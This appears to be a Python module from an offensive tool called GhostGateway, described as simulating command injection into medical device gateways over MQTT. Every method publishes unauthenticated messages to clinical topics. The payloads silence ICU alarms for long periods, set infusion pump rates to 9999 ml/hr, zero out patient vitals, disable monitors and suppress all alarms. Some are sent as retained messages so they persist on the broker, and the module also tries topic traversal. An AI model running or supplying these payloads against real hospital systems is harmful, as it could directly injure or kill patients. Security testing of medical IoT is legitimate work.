"""
GhostGateway - MQTT Injection Module
Unauthorized publish attacks on clinical IoT MQTT topics.
Simulates command injection into medical device gateways.
"""

import time
import json
import paho.mqtt.client as mqtt
from utils.logger import get_logger

logger = get_logger("MQTT-Inject")

# Clinical attack payloads targeting medical IoT topics
CLINICAL_ATTACK_PAYLOADS = [
    {
        "topic": "ward/icu/device/command",
        "payload": json.dumps({"command": "ALARM_SILENCE", "duration": 99999}),
        "label": "ICU Alarm Silence Injection",
        "severity": "CRITICAL"
    },
    {
        "topic": "patient/monitor/threshold",
        "payload": json.dumps({"heartrate_max": 9999, "spo2_min": 0}),
        "label": "Patient Monitor Threshold Manipulation",
        "severity": "CRITICAL"
    },
    {
        "topic": "device/infusion/pump/rate",
        "payload": json.dumps({"rate_ml_hr": 9999, "override": True}),
        "label": "Infusion Pump Rate Override",
        "severity": "CRITICAL"
    },
    {
        "topic": "gateway/config/update",
        "payload": json.dumps({"firmware": "ghostgateway_v1", "auth": False}),
        "label": "Gateway Config Injection",
        "severity": "HIGH"
    },
    {
        "topic": "sensor/vitals/update",
        "payload": json.dumps({"heartrate": 0, "bp_systolic": 0, "spo2": 0}),
        "label": "Fake Vitals Data Injection (Zero values)",
        "severity": "CRITICAL"
    },
    {
        "topic": "alarm/suppress",
        "payload": json.dumps({"suppress_all": True, "code": "GHOSTGATEWAY"}),
        "label": "Global Alarm Suppression",
        "severity": "CRITICAL"
    },
]


class MQTTInjection:
    def __init__(self, broker, port=1883, verbose=False):
        self.broker = broker
        self.port = port
        self.verbose = verbose
        self.findings = []

    def _create_client(self, client_id="ghostgateway_inject"):
        client = mqtt.Client(client_id=client_id)
        return client

    def publish_single(self, topic, payload, qos=1, retain=False):
        """Publish a single unauthorized message"""
        client = self._create_client()
        result = {"success": False, "topic": topic}
        try:
            client.connect(self.broker, self.port, keepalive=5)
            info = client.publish(topic, payload, qos=qos, retain=retain)
            info.wait_for_publish(timeout=3)
            client.disconnect()
            if info.rc == mqtt.MQTT_ERR_SUCCESS:
                logger.info(f"  [+] Injected -> [{topic}] : {str(payload)[:80]}")
                result["success"] = True
                result["rc"] = info.rc
            return result
        except Exception as e:
            if self.verbose:
                logger.warning(f"Publish failed: {e}")
            return result

    def attack_clinical_topics(self):
        """Inject malicious payloads into all clinical topics"""
        logger.info("[INJECT] Attacking clinical MQTT topics...")
        for attack in CLINICAL_ATTACK_PAYLOADS:
            result = self.publish_single(attack["topic"], attack["payload"])
            if result["success"]:
                self.findings.append({
                    "check": attack["label"],
                    "severity": attack["severity"],
                    "detail": f"Unauthorized publish to [{attack['topic']}]. Payload: {attack['payload']}"
                })
            time.sleep(0.2)

    def retained_message_attack(self):
        """Inject retained messages that persist on broker"""
        logger.info("[INJECT] Injecting persistent retained messages...")
        retained_attacks = [
            ("ward/icu/device/command", json.dumps({"command": "DISABLE_MONITOR"})),
            ("alarm/global/suppress", json.dumps({"suppressed": True})),
            ("gateway/auth/bypass", json.dumps({"auth_required": False})),
        ]
        for topic, payload in retained_attacks:
            result = self.publish_single(topic, payload, qos=1, retain=True)
            if result["success"]:
                self.findings.append({
                    "check": f"Retained Message Injection: {topic}",
                    "severity": "HIGH",
                    "detail": f"Retained message injected on [{topic}]. Will persist until broker restart."
                })

    def topic_traversal_inject(self):
        """Try injecting on topic variations / traversal patterns"""
        logger.info("[INJECT] Topic traversal injection attempts...")
        traversal_topics = [
            "../../../gateway/admin/command",
            "ward/icu/../../admin/override",
            "device/+/command",
            "$SYS/broker/clients/connected",
        ]
        for topic in traversal_topics:
            try:
                result = self.publish_single(topic, "GHOSTGATEWAY_TRAVERSAL")
                if result["success"]:
                    self.findings.append({
                        "check": f"Topic Traversal: {topic}",
                        "severity": "HIGH",
                        "detail": f"Published to traversal topic [{topic}]"
                    })
            except Exception:
                pass

    def run(self, topic="ward/device/command", payload="GHOSTGATEWAY_TEST"):
        logger.info("=" * 50)
        logger.info("  MQTT INJECTION MODULE - GhostGateway")
        logger.info("=" * 50)
        # Custom single inject
        result = self.publish_single(topic, payload)
        if result["success"]:
            self.findings.append({
                "check": f"Custom Injection: {topic}",
                "severity": "HIGH",
                "detail": f"Unauthorized publish succeeded. Topic: {topic}, Payload: {payload}"
            })
        # Clinical topic attacks
        self.attack_clinical_topics()
        # Retained message attack
        self.retained_message_attack()
        # Topic traversal
        self.topic_traversal_inject()
        logger.info(f"[INJECT] Complete. {len(self.findings)} findings.")
        return self.findings
